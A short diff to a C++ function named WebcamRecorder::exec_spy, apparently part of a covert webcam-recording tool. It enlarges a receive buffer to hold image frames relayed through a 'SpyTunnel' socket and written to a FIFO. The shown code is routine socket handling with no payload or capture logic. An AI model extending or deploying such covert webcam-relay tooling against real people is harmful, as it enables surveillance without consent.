@@ -20,7 +20,7 @@ void WebcamRecorder::exec_spy() {
         return;
     } 
 
-    char test_buffer[BUFFER_SIZE];
+    char frame[PIX_HEIGHT * PIX_WIDTH + BUFFER_SIZE];
     struct epoll_event events[2];
     while (true) {
         int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
@@ -38,7 +38,7 @@ void WebcamRecorder::exec_spy() {
                 }
                 return;
             } if (events[i].data.fd == tunnel_socket_) {
-                int bytes_read = recvfrom(tunnel_socket_, test_buffer, BUFFER_SIZE, 0, (struct sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
+                int bytes_read = recvfrom(tunnel_socket_, frame, sizeof(frame), 0, (struct sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
                 if (bytes_read < 0) {
                     write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                     return;
@@ -46,11 +46,11 @@ void WebcamRecorder::exec_spy() {
                     write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                     return;
                 } else {
-                    if (memcmp(test_buffer, OUT_KEY, OUT_KEY_LEN) == 0) {
+                    if (memcmp(frame, OUT_KEY, OUT_KEY_LEN) == 0) {
                         write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                         return;
                     }
-                    rc = write(tunnel_fifo_, test_buffer, bytes_read);
+                    rc = write(tunnel_fifo_, frame, bytes_read);
                     if (rc < 0) {
                         return;
                     }
